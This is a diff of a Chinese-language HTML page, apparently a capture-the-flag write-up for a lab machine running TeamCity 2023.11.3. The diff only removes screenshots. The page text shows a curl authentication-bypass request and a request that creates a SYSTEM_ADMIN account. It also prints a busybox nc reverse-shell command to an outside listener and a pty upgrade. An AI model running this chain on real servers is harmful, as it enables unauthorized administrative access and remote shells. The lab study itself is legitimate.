@@ -192,9 +192,7 @@
 <p>使用nmap进行端口扫描：nmap -A 10.10.205.41</p>
 <p><img src="/pic/brains/1.png" alt="1"></p>
 <p>扫描出来发现了一个5000端口。发现是一个登录界面。</p>
-<p><img src="/pic/brains/2.png" alt="2"></p>
 <p>这里的话，发现了它的一个版本信息：TeamCity 2023.11.3，上网搜索会发现它会有cve</p>
-<p><img src="/pic/brains/3.png" alt="3"></p>
 <pre><code>为了利用此漏洞成功调用经过身份验证的端点/app/rest/server，未经身份验证的攻击者必须在 HTTP(S) 请求期间满足以下三个要求：
 
 请求未经身份验证的资源，生成 404 响应。这可以通过请求不存在的资源来实现，例如：
@@ -220,21 +218,15 @@ C:\Users\sfewer&gt;curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.
 </code></pre>
 <pre><code class="language-cmd">curl -ik &#39;http://10.10.205.41:50000/hax?jsp=/app/rest/server;.jsp&#39;
 </code></pre>
-<p><img src="/pic/brains/4.png" alt="4"></p>
 <p>然后调整有效载荷并且添加我们的用户 jujube</p>
 <pre><code class="language-cmd">curl -ik http://10.10.205.41:50000/hax?jsp=/app/rest/users\;.jsp -X POST -H &quot;Content-Type: application/json&quot; --data &quot;&#123;\&quot;username\&quot;: \&quot;jujube\&quot;, \&quot;password\&quot;: \&quot;jujube\&quot;, \&quot;email\&quot;: \&quot;0xb0b\&quot;, \&quot;roles\&quot;: &#123;\&quot;role\&quot;: [&#123;\&quot;roleId\&quot;: \&quot;SYSTEM_ADMIN\&quot;, \&quot;scope\&quot;: \&quot;g\&quot;&#125;]&#125;&#125;&quot;
 </code></pre>
-<p><img src="/pic/brains/5.png" alt="5"></p>
 <p>然后进行登录。成功了。</p>
-<p><img src="/pic/brains/6.png" alt="6"></p>
 <p>接下来就执行找py打shell了。</p>
-<p><img src="/pic/brains/7.png" alt="7"></p>
 <p>然后反弹shell，以获取交互式shell</p>
 <p>这里推荐一个网站：<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
-<p><img src="/pic/brains/image.png" alt="image"></p>
 <pre><code class="language-cmd">busybox nc 10.17.33.100 8888 -e sh
 </code></pre>
-<p><img src="/pic/brains/8.png" alt="8"></p>
 <pre><code class="language-cmd">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
 </code></pre>
 <p>获取交互式shell，然后去用户目录拿flag</p>
